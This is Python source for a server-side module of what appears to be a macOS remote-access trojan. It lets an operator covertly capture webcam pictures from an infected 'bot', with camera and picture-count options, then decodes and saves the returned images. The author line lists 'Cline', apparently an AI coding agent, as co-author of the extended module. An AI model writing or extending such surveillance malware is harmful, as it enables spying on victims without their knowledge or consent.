# -*- coding: utf-8 -*-
__author__ = "Marten4n6", "Cline"
__license__ = "GPLv3"

from base64 import b64decode
from os import mkdir

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6", "Cline"],
            "Description": "Take a picture using the bot's webcam (with camera and quality options).",
            "References": [
                "https://github.com/rharder/imagesnap"
            ],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Local output name (Leave empty for <RANDOM>): ",
            "Camera number (e.g. 0 for default, 1 for second camera, leave empty for 0): ",
            "Number of pictures to take (leave empty for 0): "
        ]

    def setup(self, set_options):
        should_continue = self._view.should_continue([
            "A green LED will show next to the bot's camera (for about a second).",
            "This module also touches the disk."
        ])

        if should_continue:
            output_name = set_options[0]
            camera = 0
            pictures = 0

            if len(set_options) > 1:
                camera = set_options[1]
            if len(set_options) > 2:
                pictures = set_options[2]

            if not output_name:
                output_name = random_string(8)
            if str(camera).isdigit():
                camera = int(camera)
            else:
                camera = 0
            if not str(pictures).isdigit():
                pictures = 0

            return True, {
                "response_options": {
                    "output_name": output_name,
                    "camera": camera,
                    "pictures": int(pictures)
                }
            }
        else:
            return False, None

    def process_response(self, response, response_options):
        output_name = response_options["output_name"]
        output_file = path.join(OUTPUT_DIRECTORY, output_name + ".png")

        str_response = None
        if isinstance(response, bytes):
            str_response = response.decode()

        if not path.isdir(OUTPUT_DIRECTORY):
            mkdir(OUTPUT_DIRECTORY)

        if str_response and "Error executing" in str_response:
            self._view.output(str_response)
        else:
            with open(output_file, "wb") as open_file:
                open_file.write(b64decode(response))

            self._view.output_separator()
            self._view.output("Webcam picture saved to: {}".format(path.realpath(output_file)), "info")
